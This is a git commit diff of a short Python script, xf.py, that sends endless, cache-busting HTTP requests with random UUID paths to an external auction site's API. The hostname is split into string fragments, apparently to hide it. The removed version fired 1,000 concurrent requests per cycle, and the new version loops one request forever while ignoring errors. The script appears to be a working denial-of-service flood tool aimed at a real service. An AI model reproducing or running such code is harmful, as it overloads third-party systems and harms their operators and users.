7c1c490c6c0da5c1b912320091b1632ff8e91b47
rotmb <56585958+rotmb@users.noreply.github.com>
2020-06-03 16:56:50 +0300

    Add files via upload

--- xf.py
+++ xf.py
@@ -4,20 +4,15 @@ import uuid
 import aiohttp
 
 
-async def task():
-    try:
-        async with aiohttp.ClientSession() as session:
-            r = await session.get("https://auc" + "tions.cr" + "aft" + "lin" + "k.xyz/ap" + "i/wort" + f"h/{uuid.uuid4().hex}")
-            print(await r.text())
-            await asyncio.sleep(float("inf"))
-    except:
-        pass
+async def main():
+    while True:
+        try:
+            async with aiohttp.ClientSession() as session:
+                r = await session.get("https://auc" + "tions.cr" + "aft" + "lin" + "k.xyz/ap" + "i/wort" + f"h/{uuid.uuid4().hex}")
+                print(await r.text())
+        except:
+            pass
 
 
 loop = asyncio.get_event_loop()
-
-while True:
-    coroutines = [task() for _ in range(1000)]
-    tasks = asyncio.gather(*coroutines)
-
-    loop.run_until_complete(tasks)
+loop.run_until_complete(main())
